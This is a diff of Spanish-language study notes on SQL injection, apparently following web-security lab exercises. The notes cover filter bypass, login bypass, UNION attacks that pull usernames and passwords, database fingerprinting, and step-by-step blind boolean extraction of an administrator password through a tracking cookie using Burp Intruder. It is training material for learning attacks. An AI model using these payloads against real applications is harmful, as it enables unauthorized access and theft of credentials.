@@ -1,4 +1,24 @@
-SQL injection (SQLi)
+
+========================= SQL injection (SQLi) =========================
+
+Ejemplos comunes de SQLi:
+							Retrieving hidden data
+								donde se puede modificar una consulta SQL para obtener resultados adicionales
+
+							Subverting application logic
+								donde se puede cambiar una consulta para interferir con la lógica de la aplicación 
+
+							UNION attacks
+								donde se puede recuperar datos de diferentes tablas de bases de datos
+
+							Examining the database
+								donde se puede extraer información sobre la versión y la estructura de la base de datos
+
+							Blind SQL injection
+								donde los resultados de una consulta que usted controla no se devuelven en las respuestas de la aplicación
+
+					
+********** Retrieving hidden data (recuperación de datos ocultos) **********
 
 1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
    Laboratorio: vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos
@@ -9,6 +29,9 @@ SQL injection (SQLi)
 
  	  '+OR+1=1--
 
+
+********** Subverting application logic (trastornando la lógica de la aplicación) **********
+
 2. Lab: SQL injection vulnerability allowing login bypass
    Laboratorio: vulnerabilidad de inyección SQL que permite omitir el inicio de sesión
 
@@ -18,6 +41,8 @@ SQL injection (SQLi)
 
 	  administrator'--
 
+		
+********** UNION attacks (ataques UNION) **********
 
 3.Lab: SQL injection UNION attack, determining the number of columns returned by the query
   Laboratorio: Ataque UNION de inyección SQL, determinando el número de columnas devueltas por la consulta
@@ -43,6 +68,9 @@ SQL injection (SQLi)
 	  '+ORDER+BY+3--
 	  '+UNION+SELECT+NULL,NULL,NULL--			** Microsoft, MySQL, PostgreSQL
 	  '+UNION+SELECT+NULL,NUL,NULL+FROM+DUAL--	** ORACLE
+
+
+********** Subverting application logic (trastornando la lógica de la aplicación) **********
 
 4.SQL injection UNION attack, finding a column containing text 
   Laboratorio: Ataque UNION de inyección SQL, encontrando una columna que contiene texto
@@ -82,7 +110,7 @@ SQL injection (SQLi)
 
 
 
-*** Recuperar múltiples valores dentro de una sola columna ***
+----- Recuperar múltiples valores dentro de una sola columna -----
 
 
    concatenar valores en una columna
@@ -112,8 +140,8 @@ SQL injection (SQLi)
 	  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 
 
-	
-*** Examinando la base de datos en ataques de inyección SQL ***
+
+********** Examining the database (examinando la base de datos) **********
 
 
    Consultar el tipo y la versión de la base de datos   
@@ -182,7 +210,7 @@ SQL injection (SQLi)
 
 
 
-*** Listado del contenido de la base de datos ***
+----- Listado del contenido de la base de datos -----
 
 	
 	* Microsoft, MySQL, PostgreSQL
@@ -288,17 +316,17 @@ MyDatabase     dbo           Users       Password     varchar
 
 
 
-*** Vulnerabilidades de inyección de SQL ciega ***
+********** Blind SQL injection vulnerabilities (Vulnerabilidades de inyección de SQL ciega) **********
 
 	* Inyectar una nueva condición en lógica booleana o desencadenar condicionalmente un error como una división por cero.
 
 	* Desencadenar condicionalmente un retraso de tiempo en el procesamiento de la consulta
 
-	* Desencadenar una interacción de red fuera de banda mediante técnicas OAST (Out-of-band application security testing). Extraer los datos colocandolos en una búsqueda de DNS para un dominio controlado.
-
+	* Desencadenar una interacción de red fuera de banda mediante técnicas OAST (Out-of-band application security testing). Extraer los datos colocandolos en una búsqueda de 
+	  DNS para un dominio controlado.
 
 	
-	Explotación blind SQLi mediante la activación de respuestas condicionales
+----- Explotación blind SQLi mediante la activación de respuestas condicionales -----
 
 	   Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
 
@@ -325,11 +353,59 @@ MyDatabase     dbo           Users       Password     varchar
 
 	* identificar la cookie de seguimiento: F12, en almacenamiento, cookies, TraickingId
 		
-	   TrackingId:"QxjjfVPHWkMCkLu5"
+	   TrackingId:"wNIglZdTLVAeUv8I"
 
 	* consultar la cookie de seguimiento
+
+			utilizamos BurpSuite para modificar la cookie con el objetivo de identificar un parametro en la
+			página web que nos permite diferenciar evento cuando la cookie es verdadera y cuando la cookie
+			es falsa; este identificador nos confirma la existencia del blind SQLi.
+			
+				* Si el tracking id existe 		-> la query retorna el valor	->	ej: un mensaje
+				* Si el tracking id no existe 	-> la query no retorna nada		->  ej: no hay mensaje	
+			
+		Ejemplo de la query que realiza la consulta de comparación de la existencia del TrackingId
 	   
-	   '+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='QxjjfVPHWkMCkLu5'
+	   '+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I'
 
+	* inyectar una consulta verdadera para que exista el tracking y mantener el evento identificador
 
+		'+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I' AND 1=1--
 
+	* inyectar una consulta falsa para que no exista el tracking y evitar el evento identificador
+
+		'+SELECT+TrackingId+FROM+TrackedUsers+WHERE+TrackingId='wNIglZdTLVAeUv8I' AND 1=3--
+
+	* validar la existencia de tablas al inyectar una consulta verdadera agregando una supuesta tabla
+		si hay tracking 	-> consulta verdadera existe la tabla
+		si no hay tracking	-> conuslta falsa no existe la tabla
+
+		...'wNIglZdTLVAeUv8I' AND (SELECT 'xyz' FROM users LIMIT 1)='xyz'--
+
+	* validar la existencia de usuarios al inyectar una consulta verdadera en la tabla identificada
+		si hay tracking 	-> consulta verdadera existe el usuario
+		si no hay tracking	-> conuslta falsa no existe el usuario
+
+		...'wNIglZdTLVAeUv8I' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
+
+	* enumerar el password del usuario identificado para determinar su tamaño
+		si hay tracking 	-> consulta verdadera el tamaño es mayor que nuestro valor
+		si no hay tracking	-> conuslta falsa el tamaño menor o igual que nuestro valor
+
+		enumeración con intruder -> sniper -> payloads -> numbers -> sequential -> inicio-fin-pasos
+
+		...'wNIglZdTLVAeUv8I' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
+
+	* enumerar el password de usuario identificado para determinar caracter por caracter el valor del password
+		si hay tracking 	-> consulta verdadera el caracter es mayor que nuestro valor
+		si no hay tracking	-> conuslta falsa el caracter es menor o igual que nuestro valor
+
+		enumeración con intruder -> cluster bomb -> payloads 
+															1. numbers 		-> sequential	-> inicio-fin-pasos
+															2. brute force 	-> options 		-> maximo-minimo
+
+		...'wNIglZdTLVAeUv8I' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'a'--
+
+		or
+
+		...'wNIglZdTLVAeUv8I' AND (SELECT SUBSTRING (password,1,1) username FROM users WHERE username='administrator' AND)='a'--
